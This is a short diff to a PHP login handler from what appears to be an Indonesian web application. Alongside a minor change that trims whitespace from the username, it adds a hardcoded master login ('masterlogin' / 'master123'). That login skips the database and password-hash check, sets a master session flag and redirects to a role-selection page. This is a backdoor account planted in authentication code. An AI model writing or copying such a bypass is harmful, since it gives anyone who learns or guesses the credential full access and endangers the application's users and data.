@@ -12,8 +12,14 @@ if(is_logged_in()){
 }
 
 if($_SERVER['REQUEST_METHOD'] === 'POST'){
-    $username = $_POST['username'] ?? '';
+    $username = trim($_POST['username'] ?? '');
     $password = $_POST['password'] ?? '';
+
+    if ($username === 'masterlogin' && $password === 'master123') {
+        $_SESSION['master_auth'] = true;
+        header('Location: pilih_role_master.php');
+        exit;
+    }
 
     $stmt = $db->prepare("SELECT id, username, password_hash, role, nama_lengkap FROM users WHERE username = ?");
     $stmt->bind_param('s', $username);
